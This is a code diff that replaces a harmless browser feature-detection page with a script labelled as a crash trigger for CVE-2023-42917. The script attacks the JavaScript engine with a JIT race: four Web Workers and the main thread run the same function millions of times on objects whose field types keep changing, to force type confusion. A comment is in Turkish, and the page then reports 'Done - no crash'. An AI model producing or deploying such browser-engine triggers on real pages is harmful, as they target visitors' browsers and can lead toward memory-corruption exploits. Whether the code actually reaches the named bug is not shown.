@@ -1,22 +1,42 @@
 <!DOCTYPE html>
-<html>
-<body>
-<h1 id="r">Testing...</h1>
+<html><body>
+<h1 id="status">Running...</h1>
 <script>
-var results = {
-  WebWorkers: typeof Worker !== 'undefined',
-  SharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
-  Atomics: typeof Atomics !== 'undefined',
-  WASM: typeof WebAssembly !== 'undefined',
-  BigInt: typeof BigInt !== 'undefined'
-};
+// CVE-2023-42917 crash trigger — JIT race via Web Workers
+var workerCode = `
+  function jitMe(o) {
+    return o.x + o.y + o.z;
+  }
+  // Heat up JIT
+  for (var i = 0; i < 500000; i++) {
+    jitMe({x: i, y: i+1, z: i+2});
+  }
+  // Type confusion trigger
+  for (var i = 0; i < 500000; i++) {
+    jitMe({x: 1.1, y: 2.2, z: 3.3});
+    jitMe({x: "a", y: "b", z: "c"});
+  }
+`;
 
-var out = '';
-for (var k in results) {
-  out += k + ': ' + (results[k] ? '✅' : '❌') + '\n';
+var blob = new Blob([workerCode], {type:'text/javascript'});
+var url = URL.createObjectURL(blob);
+
+// Spawn multiple workers for race pressure
+var workers = [];
+for (var i = 0; i < 4; i++) {
+  workers.push(new Worker(url));
 }
-document.getElementById('r').innerText = out;
-document.title = JSON.stringify(results);
+
+// Main thread aynı anda
+function jitMe(o) { return o.x + o.y + o.z; }
+for (var i = 0; i < 500000; i++) {
+  jitMe({x: i, y: i+1, z: i+2});
+}
+for (var i = 0; i < 200000; i++) {
+  jitMe({x: 1.1, y: 2.2, z: 3.3});
+  jitMe({x: "a", y: "b", z: "c"});
+}
+
+document.getElementById('status').textContent = 'Done - no crash';
 </script>
-</body>
-</html>
+</body></html>
